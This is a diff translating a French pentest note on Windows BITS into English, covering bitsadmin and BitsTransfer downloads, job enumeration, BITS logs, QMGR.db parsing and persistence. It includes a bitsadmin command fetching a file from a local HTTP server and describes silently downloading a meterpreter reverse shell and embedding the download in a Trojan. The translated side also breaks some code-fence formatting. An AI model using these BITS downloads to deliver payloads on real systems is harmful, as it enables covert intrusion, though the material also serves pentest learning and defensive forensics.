@@ -1,60 +1,60 @@
-### Introduction à BITS : 
+### Introduction to BITS: 
 
-BITS veux dire Background Intelligent Transfer Service est un service très utilisé pour télécharger des fichiers à partir ou vers des serveurs Web HTTP et partage de fichier SMB. BITS est suffisamment autonome pour réduire un maximum les couts pour que se soit le plus optimisé possible pour l'utilisateur ou le programmeur car oui BITS peux aussi etre utile en programmation, BITS est programmable en C/C++ et peut etre appellé dans du .NET tout cela grace à COM.
-BITS possède une version CLI qui s'appelle BitsAdmin et des commandes incluses dans le powershell. BITS peut etre utilisé pour de l'administration avec des systèmes de Logs depuis des actions comme /transfer ou les protocoles SANP ( protocoles de notification ) exemple : `SetNotifyFlag`. En pentest, BITS est très utilisé pour du EOAP ( Exfiltration over Alternative Protocol).
-Utilisation de bitsadmin et analyse du traffics :
+BITS stands for Background Intelligent Transfer Service and is a widely used service for downloading files from or to HTTP web servers and SMB file sharing. BITS is sufficiently autonomous to reduce the costs as much as possible to be as optimized as possible for the user or the programmer because yes BITS can also be useful in programming, BITS is programmable in C/C++ and can be called in .NET all that thanks to COM.
+BITS has a CLI version called BitsAdmin and commands included in the powershell. BITS can be used for administration with logging systems from actions like /transfer or SANP protocols (notification protocols) for example: `SetNotifyFlag`. In pentest, BITS is very used for EOAP (Exfiltration over Alternative Protocol).
+Use of bitsadmin and analysis of traffics:
 
-```powershell
+``powershell
 bitsadmin /transfer howtohack http://192.168.1.45:8000/ak.txt "C:\Users\hth\Documents\ak.txt"
 ```
 
-- **DISPLAY**: nom de job
-- **FILE**: nombre de fichier
-- **BYTES**: tailles du fichier "c le hack"
-- **PRIORITY**: correspond à l'ordre de téléchargement
-- **STATE**: Transféré, état du job.
+- DISPLAY**: job name
+- FILE**: number of files
+- BYTES**: size of the "c hack" file
+- PRIORITY**: corresponds to the order of download
+- STATE**: Transferred, state of the job.
 
-on peux aussi l'utiliser avec le modules du PowerShell : `BitsTransfer`
-```powershell
+you can also use it with the PowerShell modules: `BitsTransfer`
+``powershell
 Import-Module BitsTransfer
 ```
 
-BITS supporte par défaut le transfère asynchrone mais vous pouvez y précisez via l'argument `-Asychronous`, pour la validation du fichier il faut utiliser `Complete-BitsTransfer`.
-Téléchargement d'un reverse shell meterpreter silencieusement : 
+BITS supports asynchronous transfer by default but you can specify via the `-Asychronous` argument, for the file validation you have to use `Complete-BitsTransfer`.
+Downloading a meterpreter reverse shell silently: 
 
 ![image](https://user-images.githubusercontent.com/75935486/152225631-6de1bd82-5dc8-4ac3-b861-a73634d4fe45.png)
 
-on lance le server HTTP et on télécharge la charge utile evasive via BITS en asynchrone. Dans un cadre de contamination en masse on peux rendre le téléchargement automatique en C ou C++ dans une tierce parti de Trojan, mais dans le cadre éducatif on reste dans des choses simple.
+start the HTTP server and download the evasive payload via BITS asynchronously. In the context of mass contamination, we can make the download automatic in C or C++ in a third party Trojan, but in the educational context we stay in simple things.
 
 
-#### BITSAdmin enumeration : 
+#### BITSAdmin enumeration: 
 
-```powershell
-# listé les jobs
+``powershell
+# listed jobs
 bitsadmin /list
-# avoir plus d'info sur un job
+# get more info on a job
 bitsadmin /info 482FCAF0-74BF-469B-8929-5CCD028C9499 /verbose
-# géré les jobs actuels
+# manage the current jobs
 bitsadmin /monitor
-# un seul job à géré
+# only one job to manage
 bitsadmin /monitor 482FCAF0-74BF-469B-8929-5CCD028C9499
-# info complète (Notify, Proxy, GUID...) sur tout les jobs actif :
+# complete info (Notify, Proxy, GUID...) on all active jobs:
 bitsadmin /info
 ```
 
-Logs BITS : `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational`
+BITS logs : `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational`
 
 ![image](https://user-images.githubusercontent.com/75935486/152225800-497abaf1-1545-48b0-903e-9d87c51242f6.png)
 
 
-#### BITS Enumeration depuis des requetes SC et depuis la db QMGR & ESE : 
+#### BITS Enumeration from SC queries and from the QMGR & ESE db: 
 
-QMGR signifie Querie Manager, il enregistre chaque activité de chaque BITS Job dans une base de données mais c'est chiffré, il faut utiliser hex editor ou autre editeur de base16 pour ésperer dump quelque chose.
-ici ce qui nous interesse c'est QMGR.db car c'est que sont loggé les infos des BITS Job
+QMGR stands for Querie Manager, it records every activity of every BITS Job in a database but it's encrypted, you have to use hex editor or other database editor16 to hope to dump something.
+here what we are interested in is QMGR.db because it's where the BITS Job info is logged
 
 ![image](https://user-images.githubusercontent.com/75935486/152225890-df0b4a93-7476-4513-bd75-b470dc0752a3.png)
 
-```json
+``json
 > python BitsParser.py -i qmgr.db
 Processing file qmgr.db
 {
@@ -64,18 +64,18 @@ Processing file qmgr.db
     "JobId": "b733e5e1-12ad-463e-a125-ade26cc1fab6",
     "JobName": "SpeechModelDownloadJob",
     "OwnerSID": "S-1-5-20",
-    "Owner": "NT AUTHORITY\\NETWORK SERVICE",
+    "Owner": "NT AUTHORITY\NETWORK SERVICE",
     "CreationTime": "2021-01-25T11:52:05Z",
     "ModifiedTime": "2021-01-25T12:45:21Z"
 }
 ```
 
-#### Pesistence avec BITS : 
+#### Pesistence with BITS : 
 
-élever la priorité de téléchargement. `/priority high`
+Raising the download priority. `/priority high`
 
-Compromissions de Windows BITS:
+Windows BITS compromises:
 - https://www.secureworks.com/blog/malware-lingers-with-bits
 
-développement C++/C/.NET avec intégration de BITS : 
+C++/C/.NET development with BITS integration: 
 - https://docs.microsoft.com/en-us/windows/win32/bits/using-bits
